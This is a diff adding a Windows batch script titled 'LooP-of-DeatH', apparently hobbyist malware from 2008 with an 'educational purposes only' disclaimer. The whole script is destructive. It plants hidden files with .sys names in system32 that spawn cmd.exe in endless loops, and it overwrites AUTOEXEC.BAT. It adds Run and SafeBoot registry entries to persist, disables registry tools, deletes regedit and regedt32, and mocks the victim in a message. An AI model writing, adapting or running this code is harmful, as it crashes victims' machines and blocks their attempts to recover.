@@ -1,0 +1,197 @@
+************************[+]   LooP-of-DeatH [+]
+***************************[+]    made by    [+]
+******************************[+]   cmiN   [+]
+
+*************************:::::22.08.2008:::::
+
+
+***** It's not my responsibility with uses and damages caused by this script/program because was made for educational purposes only
+
+@echo off
+:: start
+cls
+cd %systemroot%
+cd..
+echo %cd%>%systemroot%\system32\path.txt
+set /p pathx=<%systemroot%\system32\path.txt
+
+:: firstbak
+md %systemroot%\lanay
+copy %pathx%AUTOEXEC.BAT %systemroot%\lanay\ntdc.bak
+
+:: creatingMainFile
+echo @echo OFF >%systemroot%\system32\nscvr32.sys
+echo cls >>%systemroot%\system32\nscvr32.sys
+echo title .: LooP-of-DeatH :. [cmiN] >>%systemroot%\system32\nscvr32.sys
+echo. >>%systemroot%\system32\nscvr32.sys
+
+echo set "a=echo :loop >%systemroot%\bucla.bat" >>%systemroot%\system32\nscvr32.sys
+echo set "b=echo start cmd.exe >>%systemroot%\bucla.bat" >>%systemroot%\system32\nscvr32.sys
+echo set "c=echo goto loop >>%systemroot%\bucla.bat" >>%systemroot%\system32\nscvr32.sys
+
+echo set "d=echo :loop >%systemroot%\bucla1.bat" >>%systemroot%\system32\nscvr32.sys
+echo set "e=echo start cmd.exe >>%systemroot%\bucla1.bat" >>%systemroot%\system32\nscvr32.sys
+echo set "f=echo goto loop >>%systemroot%\bucla1.bat" >>%systemroot%\system32\nscvr32.sys
+
+echo set "g=echo :loop >%systemroot%\bucla2.bat" >>%systemroot%\system32\nscvr32.sys
+echo set "h=echo start cmd.exe >>%systemroot%\bucla2.bat" >>%systemroot%\system32\nscvr32.sys
+echo set "j=echo goto loop >>%systemroot%\bucla2.bat" >>%systemroot%\system32\nscvr32.sys
+
+echo set "k=echo :loop >%systemroot%\bucla3.bat" >>%systemroot%\system32\nscvr32.sys
+echo set "L=echo start cmd.exe >>%systemroot%\bucla3.bat" >>%systemroot%\system32\nscvr32.sys
+echo set "m=echo goto loop >>%systemroot%\bucla3.bat" >>%systemroot%\system32\nscvr32.sys
+
+echo set "n=echo :loop >%systemroot%\bucla4.bat" >>%systemroot%\system32\nscvr32.sys
+echo set "o=echo start cmd.exe >>%systemroot%\bucla4.bat" >>%systemroot%\system32\nscvr32.sys
+echo set "p=echo goto loop >>%systemroot%\bucla4.bat" >>%systemroot%\system32\nscvr32.sys
+
+echo set "q=echo :loop >%systemroot%\bucla5.bat" >>%systemroot%\system32\nscvr32.sys
+echo set "r=echo start cmd.exe >>%systemroot%\bucla5.bat" >>%systemroot%\system32\nscvr32.sys
+echo set "s=echo goto loop >>%systemroot%\bucla5.bat" >>%systemroot%\system32\nscvr32.sys
+
+echo set "t=echo :loop >%systemroot%\bucla6.bat" >>%systemroot%\system32\nscvr32.sys
+echo set "u=echo start cmd.exe >>%systemroot%\bucla6.bat" >>%systemroot%\system32\nscvr32.sys
+echo set "v=echo goto loop >>%systemroot%\bucla6.bat" >>%systemroot%\system32\nscvr32.sys
+
+echo set "x=echo :loop >%systemroot%\bucla7.bat" >>%systemroot%\system32\nscvr32.sys
+echo set "y=echo start cmd.exe >>%systemroot%\bucla7.bat" >>%systemroot%\system32\nscvr32.sys
+echo set "z=echo goto loop >>%systemroot%\bucla7.bat" >>%systemroot%\system32\nscvr32.sys
+
+echo set "ab=echo :loop >%systemroot%\bucla8.bat" >>%systemroot%\system32\nscvr32.sys
+echo set "ac=echo start cmd.exe >>%systemroot%\bucla8.bat" >>%systemroot%\system32\nscvr32.sys
+echo set "ad=echo goto loop >>%systemroot%\bucla8.bat" >>%systemroot%\system32\nscvr32.sys
+
+echo set "ae=echo :loop >%systemroot%\bucla9.bat" >>%systemroot%\system32\nscvr32.sys
+echo set "af=echo start cmd.exe >>%systemroot%\bucla9.bat" >>%systemroot%\system32\nscvr32.sys
+echo set "ag=echo goto loop >>%systemroot%\bucla9.bat" >>%systemroot%\system32\nscvr32.sys
+
+echo START %systemroot%\buclafinala.bat >%pathx%AUTOEXEC.BAT
+
+echo %%a%% >>%systemroot%\system32\nscvr32.sys
+echo %%b%% >>%systemroot%\system32\nscvr32.sys
+echo %%c%% >>%systemroot%\system32\nscvr32.sys
+echo %%d%% >>%systemroot%\system32\nscvr32.sys
+echo %%e%% >>%systemroot%\system32\nscvr32.sys
+echo %%f%% >>%systemroot%\system32\nscvr32.sys
+echo %%g%% >>%systemroot%\system32\nscvr32.sys
+echo %%h%% >>%systemroot%\system32\nscvr32.sys
+echo %%j%% >>%systemroot%\system32\nscvr32.sys
+echo %%k%% >>%systemroot%\system32\nscvr32.sys
+echo %%L%% >>%systemroot%\system32\nscvr32.sys
+echo %%m%% >>%systemroot%\system32\nscvr32.sys
+echo %%n%% >>%systemroot%\system32\nscvr32.sys
+echo %%o%% >>%systemroot%\system32\nscvr32.sys
+echo %%p%% >>%systemroot%\system32\nscvr32.sys
+echo %%q%% >>%systemroot%\system32\nscvr32.sys
+echo %%r%% >>%systemroot%\system32\nscvr32.sys
+echo %%s%% >>%systemroot%\system32\nscvr32.sys
+echo %%t%% >>%systemroot%\system32\nscvr32.sys
+echo %%u%% >>%systemroot%\system32\nscvr32.sys
+echo %%v%% >>%systemroot%\system32\nscvr32.sys
+echo %%x%% >>%systemroot%\system32\nscvr32.sys
+echo %%y%% >>%systemroot%\system32\nscvr32.sys
+echo %%z%% >>%systemroot%\system32\nscvr32.sys
+echo %%ab%% >>%systemroot%\system32\nscvr32.sys
+echo %%ac%% >>%systemroot%\system32\nscvr32.sys
+echo %%ad%% >>%systemroot%\system32\nscvr32.sys
+echo %%ae%% >>%systemroot%\system32\nscvr32.sys
+echo %%af%% >>%systemroot%\system32\nscvr32.sys
+echo %%ag%% >>%systemroot%\system32\nscvr32.sys
+echo exit >>%systemroot%\system32\nscvr32.sys
+
+:: creatingSecondFile
+echo SET "buclafinala=START bucla.bat | START bucla1.bat | START bucla2.bat | START bucla3.bat | START bucla4.bat | START bucla5.bat | START bucla6.bat | START bucla7.bat | START bucla8.bat | START bucla9.bat" >%systemroot%\system32\nrvcs64.sys
+echo %%buclafinala%% >>%systemroot%\system32\nrvcs64.sys
+echi exit >>%systemroot%\system32\nrvcs64.sys
+
+:: creatingThirdFile
+echo @echo off >%systemroot%\system32\verif.bat
+echo attrib -r -h -s %systemroot%\system32\path.txt >>%systemroot%\system32\verif.bat
+echo attrib -r -h -s %systemroot%\system32\nscvr32.sys >>%systemroot%\system32\verif.bat
+echo attrib -r -h -s %systemroot%\system32\nrvcs64.sys >>%systemroot%\system32\verif.bat
+echo attrib -r -h -s %systemroot%\buclemaker.bat >>%systemroot%\system32\verif.bat
+echo attrib -r -h -s %systemroot%\buclafinala.bat >>%systemroot%\system32\verif.bat
+echo attrib -r -h -s %systemroot%\bucla.bat >>%systemroot%\system32\verif.bat
+echo attrib -r -h -s %systemroot%\bucla1.bat >>%systemroot%\system32\verif.bat
+echo attrib -r -h -s %systemroot%\bucla2.bat >>%systemroot%\system32\verif.bat
+echo attrib -r -h -s %systemroot%\bucla3.bat >>%systemroot%\system32\verif.bat
+echo attrib -r -h -s %systemroot%\bucla4.bat >>%systemroot%\system32\verif.bat
+echo attrib -r -h -s %systemroot%\bucla5.bat >>%systemroot%\system32\verif.bat
+echo attrib -r -h -s %systemroot%\bucla6.bat >>%systemroot%\system32\verif.bat
+echo attrib -r -h -s %systemroot%\bucla7.bat >>%systemroot%\system32\verif.bat
+echo attrib -r -h -s %systemroot%\bucla8.bat >>%systemroot%\system32\verif.bat
+echo attrib -r -h -s %systemroot%\bucla9.bat >>%systemroot%\system32\verif.bat
+echo attrib -r -h -s %pathx%AUTOEXEC.BAT >>%systemroot%\system32\verif.bat
+
+echo if not exist %systemroot%\buclemaker.bat copy %systemroot%\system32\nscvr32.sys %systemroot%\buclemaker.bat >>%systemroot%\system32\verif.bat
+echo if not exist %systemroot%\buclafinala.bat copy %systemroot%\system32\nrvcs64.sys %systemroot%\buclafinala.bat >>%systemroot%\system32\verif.bat
+echo. >>%systemroot%\system32\verif.bat
+echo if not exist %systemroot%\bucla.bat START /MIN /REALTIME /wait %systemroot%\buclemaker.bat >>%systemroot%\system32\verif.bat
+echo if not exist %systemroot%\bucla1.bat START /MIN /REALTIME /wait %systemroot%\buclemaker.bat >>%systemroot%\system32\verif.bat
+echo if not exist %systemroot%\bucla2.bat START /MIN /REALTIME /wait %systemroot%\buclemaker.bat >>%systemroot%\system32\verif.bat
+echo if not exist %systemroot%\bucla3.bat START /MIN /REALTIME /wait %systemroot%\buclemaker.bat >>%systemroot%\system32\verif.bat
+echo if not exist %systemroot%\bucla4.bat START /MIN /REALTIME /wait %systemroot%\buclemaker.bat >>%systemroot%\system32\verif.bat
+echo if not exist %systemroot%\bucla5.bat START /MIN /REALTIME /wait %systemroot%\buclemaker.bat >>%systemroot%\system32\verif.bat
+echo if not exist %systemroot%\bucla6.bat START /MIN /REALTIME /wait %systemroot%\buclemaker.bat >>%systemroot%\system32\verif.bat
+echo if not exist %systemroot%\bucla7.bat START /MIN /REALTIME /wait %systemroot%\buclemaker.bat >>%systemroot%\system32\verif.bat
+echo if not exist %systemroot%\bucla8.bat START /MIN /REALTIME /wait %systemroot%\buclemaker.bat >>%systemroot%\system32\verif.bat
+echo if not exist %systemroot%\bucla9.bat START /MIN /REALTIME /wait %systemroot%\buclemaker.bat >>%systemroot%\system32\verif.bat
+
+echo reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 0 /f >>%systemroot%\system32\verif.bat
+echo reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SystemVerif /t REG_SZ /d %systemroot%\system32\verif.bat /f >>%systemroot%\system32\verif.bat
+echo reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v SystemVerif /t REG_SZ /d %systemroot%\system32\verif.bat /f >>%systemroot%\system32\verif.bat
+echo reg add HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Run /v SystemVerif /t REG_SZ /d %systemroot%\system32\verif.bat /f >>%systemroot%\system32\verif.bat
+echo reg add HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\dmboots.sys /v SystemVerif /t REG_SZ /d %systemroot%\system32\verif.bat /f >>%systemroot%\system32\verif.bat
+echo reg add HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\Base /v SystemVerif /t REG_SZ /d %systemroot%\system32\verif.bat /f >>%systemroot%\system32\verif.bat
+echo reg add HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\dmboots.sys /v SystemVerif /t REG_SZ /d %systemroot%\system32\verif.bat /f >>%systemroot%\system32\verif.bat
+echo reg add HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\Base /v SystemVerif /t REG_SZ /d %systemroot%\system32\verif.bat /f >>%systemroot%\system32\verif.bat
+echo reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >>%systemroot%\system32\verif.bat
+
+echo attrib +r +h +s %systemroot%\system32\path.txt >>%systemroot%\system32\verif.bat
+echo attrib +r +h +s %systemroot%\system32\nscvr32.sys >>%systemroot%\system32\verif.bat
+echo attrib +r +h +s %systemroot%\system32\nrvcs64.sys >>%systemroot%\system32\verif.bat
+echo attrib +r +h +s %systemroot%\buclemaker.bat >>%systemroot%\system32\verif.bat
+echo attrib +r +h +s %systemroot%\buclafinala.bat >>%systemroot%\system32\verif.bat
+echo attrib +r +h +s %systemroot%\bucla.bat >>%systemroot%\system32\verif.bat
+echo attrib +r +h +s %systemroot%\bucla1.bat >>%systemroot%\system32\verif.bat
+echo attrib +r +h +s %systemroot%\bucla2.bat >>%systemroot%\system32\verif.bat
+echo attrib +r +h +s %systemroot%\bucla3.bat >>%systemroot%\system32\verif.bat
+echo attrib +r +h +s %systemroot%\bucla4.bat >>%systemroot%\system32\verif.bat
+echo attrib +r +h +s %systemroot%\bucla5.bat >>%systemroot%\system32\verif.bat
+echo attrib +r +h +s %systemroot%\bucla6.bat >>%systemroot%\system32\verif.bat
+echo attrib +r +h +s %systemroot%\bucla7.bat >>%systemroot%\system32\verif.bat
+echo attrib +r +h +s %systemroot%\bucla8.bat >>%systemroot%\system32\verif.bat
+echo attrib +r +h +s %systemroot%\bucla9.bat >>%systemroot%\system32\verif.bat
+echo attrib +r +h +s %%pathx%%AUTOEXEC.BAT >>%systemroot%\system32\verif.bat
+echo. >>%systemroot%\system32\verif.bat
+echo START %systemroot%\buclafinala.bat >>%systemroot%\system32\verif.bat
+echo exit >>%systemroot%\system32\verif.bat
+
+:: creating AUTOEXEC.BAT
+echo START %systemroot%\buclafinala.bat >%pathx%AUTOEXEC.BAT
+
+attrib +r +h +s %systemroot%\system32\verif.bat
+
+
+:: secondbak
+md %systemroot%\lanay32
+copy %systemroot%\system32\dllcache\regedit.exe %systemroot%\lanay32\ftp.pol
+copy %systemroot%\system32\dllcache\regedt32.exe %systemroot%\lanay32\fto.pol
+if NOT exist %systemroot%\system32\dllcache\regedit.exe goto copyy
+goto delete
+:copyy
+copy %systemroot%\regedit.exe %systemroot%\lanay32\ftp.pol
+if NOT exist %systemroot%\regedit.exe goto copyyy
+goto delete
+:copyyy
+copy %systemroot%\system32\regedit.exe %systemroot%\lanay32\ftp.pol
+:delete
+del /q /f %systemroot%\regedit.exe
+del /q /f %systemroot%\regedt32.exe
+del /q /f %systemroot%\system32\regedit.exe   
+del /q /f %systemroot%\system32\regedt32.exe
+del /q /f %systemroot%\system32\dllcache\regedit.exe
+del /q /f %systemroot%\system32\dllcache\regedt32.exe
+
+msg * You are fucked up by cmiN !!!
+START /MIN /REALTIME %systemroot%\system32\verif.bat
